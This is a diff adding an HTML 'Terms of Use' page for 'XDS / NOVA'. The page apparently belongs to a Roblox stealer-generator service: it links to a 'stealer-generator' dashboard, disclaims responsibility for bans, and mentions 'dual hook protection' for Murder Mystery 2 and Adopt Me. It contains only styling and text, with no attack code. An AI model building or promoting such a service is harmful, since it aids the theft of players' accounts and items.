@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>XDS / NOVA — Terms</title>
+
+<style>
+*{
+    box-sizing:border-box;
+    margin:0;
+    padding:0;
+}
+
+:root{
+    --bg:#020202;
+    --border:rgba(255,255,255,.1);
+}
+
+html{
+    scroll-behavior:smooth;
+}
+
+body{
+    min-height:100vh;
+    color:#fff;
+    background:
+        radial-gradient(circle at 50% -10%,rgba(255,255,255,.08),transparent 35%),
+        radial-gradient(circle at 0% 100%,rgba(255,255,255,.03),transparent 30%),
+        var(--bg);
+    font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+    overflow-x:hidden;
+}
+
+body:before{
+    content:"";
+    position:fixed;
+    inset:0;
+    pointer-events:none;
+    opacity:.12;
+    background-image:
+        linear-gradient(rgba(255,255,255,.03) 1px,transparent 1px),
+        linear-gradient(90deg,rgba(255,255,255,.03) 1px,transparent 1px);
+    background-size:45px 45px;
+}
+
+/* TOP BAR */
+nav{
+    height:74px;
+    padding:0 7%;
+    display:flex;
+    justify-content:flex-end;
+    align-items:center;
+    border-bottom:1px solid var(--border);
+    background:rgba(0,0,0,.5);
+    backdrop-filter:blur(24px);
+    position:sticky;
+    top:0;
+    z-index:50;
+}
+
+/* TOP RIGHT DASHBOARD */
+.logo{
+    text-decoration:none;
+    display:flex;
+    align-items:center;
+    font-weight:900;
+    letter-spacing:1.5px;
+    font-size:14px;
+    transition:.2s;
+}
+
+.logo:hover{
+    opacity:.65;
+}
+
+.dash{
+    color:#fff;
+}
+
+.board{
+    color:transparent;
+    -webkit-text-stroke:1px rgba(255,255,255,.45);
+}
+
+/* MAIN */
+main{
+    width:min(800px,92%);
+    margin:auto;
+    padding:70px 0 100px;
+}
+
+/* CENTER TITLE */
+.hero{
+    text-align:center;
+    margin-bottom:38px;
+}
+
+.badge{
+    display:inline-flex;
+    align-items:center;
+    padding:7px 14px;
+    border:1px solid rgba(255,255,255,.12);
+    border-radius:100px;
+    color:#777;
+    font-size:9px;
+    font-weight:700;
+    letter-spacing:2px;
+    margin-bottom:20px;
+    background:rgba(255,255,255,.02);
+}
+
+h1{
+    font-size:clamp(46px,9vw,78px);
+    letter-spacing:-5px;
+    line-height:.9;
+    font-weight:950;
+}
+
+h1 .solid{
+    color:#fff;
+}
+
+h1 .outline{
+    color:transparent;
+    -webkit-text-stroke:1px rgba(255,255,255,.45);
+}
+
+.hero p{
+    color:#666;
+    font-size:12px;
+    margin-top:20px;
+    line-height:1.7;
+}
+
+/* OFFICIAL LINK */
+.official-link{
+    margin-top:10px !important;
+    color:#444 !important;
+    font-size:9px !important;
+    font-weight:700;
+    letter-spacing:1px;
+}
+
+.official-link a{
+    color:#777;
+    text-decoration:none;
+    transition:.2s;
+    word-break:break-all;
+}
+
+.official-link a:hover{
+    color:#fff;
+}
+
+/* TERMS PANEL */
+.panel{
+    padding:30px;
+    border:1px solid var(--border);
+    border-radius:22px;
+    background:
+        linear-gradient(
+            145deg,
+            rgba(255,255,255,.05),
+            rgba(255,255,255,.01)
+        );
+    box-shadow:
+        0 30px 90px rgba(0,0,0,.65),
+        inset 0 1px rgba(255,255,255,.04);
+    backdrop-filter:blur(28px);
+}
+
+/* TERMS SECTIONS */
+.section{
+    padding:20px 0;
+    border-bottom:1px solid rgba(255,255,255,.08);
+}
+
+.section:first-child{
+    padding-top:0;
+}
+
+.section:last-of-type{
+    border-bottom:0;
+}
+
+.section h2{
+    font-size:12px;
+    font-weight:900;
+    letter-spacing:1.5px;
+    color:#ddd;
+    margin-bottom:10px;
+    text-transform:uppercase;
+}
+
+.section p{
+    color:#777;
+    font-size:12px;
+    line-height:1.8;
+}
+
+/* DISCORD BUTTON */
+.contact{
+    display:flex;
+    justify-content:center;
+    margin-top:28px;
+}
+
+.contact a{
+    text-decoration:none;
+    color:#bbb;
+    font-size:11px;
+    font-weight:700;
+    letter-spacing:.5px;
+    padding:14px 22px;
+    border:1px solid rgba(255,255,255,.14);
+    border-radius:12px;
+    background:rgba(255,255,255,.04);
+    transition:.2s;
+}
+
+.contact a:hover{
+    color:#fff;
+    background:rgba(255,255,255,.08);
+    border-color:rgba(255,255,255,.35);
+    transform:translateY(-2px);
+}
+
+/* FOOTER */
+footer{
+    text-align:center;
+    margin-top:30px;
+    color:#2a2a2a;
+    font-size:8px;
+    letter-spacing:1.6px;
+}
+
+@media(max-width:600px){
+    nav{
+        padding:0 6%;
+    }
+
+    main{
+        padding-top:48px;
+    }
+
+    .panel{
+        padding:22px;
+    }
+
+    h1{
+        letter-spacing:-3px;
+    }
+
+    .contact a{
+        width:100%;
+        text-align:center;
+        font-size:10px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<!-- TOP RIGHT DASHBOARD -->
+<nav>
+    <a
+        class="logo"
+        href="https://stealer-generator.github.io/dashboard/"
+        aria-label="Go to Dashboard"
+    >
+        <span class="dash">DASH</span><span class="board">BOARD</span>
+    </a>
+</nav>
+
+<main>
+
+<section class="hero">
+
+    <div class="badge">
+        ✦ TERMS OF USE
+    </div>
+
+    <h1>
+        <span class="solid">XDS</span>
+        <span class="outline">/ NOVA</span>
+    </h1>
+
+    <p>
+        Please read before using any XDS / NOVA services or content.
+    </p>
+
+    <!-- ONLY OFFICIAL LINK -->
+    <p class="official-link">
+        THE ONLY OFFICIAL LINK IS
+        <a
+            href="https://stealer-generator.github.io/dashboard/"
+            target="_blank"
+            rel="noopener"
+        >
+            STEALER-GENERATOR.GITHUB.IO/DASHBOARD
+        </a>
+    </p>
+
+</section>
+
+<div class="panel">
+
+    <div class="section">
+        <h2>USE AT YOUR OWN RISK</h2>
+        <p>
+            By using XDS / NOVA, you understand that you are responsible
+            for your own actions and how you choose to use any content,
+            tools, scripts, or information provided.
+        </p>
+    </div>
+
+    <div class="section">
+        <h2>NO RESPONSIBILITY FOR BANS</h2>
+        <p>
+            XDS / NOVA is not responsible for account bans, restrictions,
+            suspensions, resets, lost progress, or any other action taken
+            by a game, platform, service, or third party.
+        </p>
+    </div>
+
+    <div class="section">
+        <h2>NO GUARANTEE</h2>
+        <p>
+            We do not guarantee that anything provided will work forever.
+            Updates from games, platforms, Discord, Roblox, or other
+            services may cause features or content to stop working at
+            any time.
+        </p>
+    </div>
+
+    <div class="section">
+        <h2>YOUR ACCOUNT, YOUR RESPONSIBILITY</h2>
+        <p>
+            You are responsible for keeping your accounts and personal
+            information secure. Do not share passwords, login details,
+            authentication codes, or other private account information.
+        </p>
+    </div>
+
+    <div class="section">
+        <h2>THIRD-PARTY SERVICES</h2>
+        <p>
+            XDS / NOVA may reference or link to third-party websites,
+            Discord servers, tools, or services. We are not responsible
+            for the content, availability, security, or actions of those
+            third parties.
+        </p>
+    </div>
+
+    <div class="section">
+        <h2>DUAL HOOK INFORMATION</h2>
+        <p>
+            Dual hook protection is currently only available for
+            Murder Mystery 2 and Adopt Me. Other supported games do not
+            use dual hook protection.
+        </p>
+    </div>
+
+    <div class="section">
+        <h2>USE AT YOUR OWN RISK</h2>
+        <p>
+            By continuing to use XDS / NOVA, you acknowledge that you
+            understand these terms and accept responsibility for your
+            own actions.
+        </p>
+    </div>
+
+    <div class="contact">
+        <a href="#">
+            ANY QUESTIONS / SUGGESTIONS? DM 06.XD ON DISCORD
+        </a>
+    </div>
+
+</div>
+
+<footer>
+    XDS / NOVA
+</footer>
+
+</main>
+
+</body>
+</html>
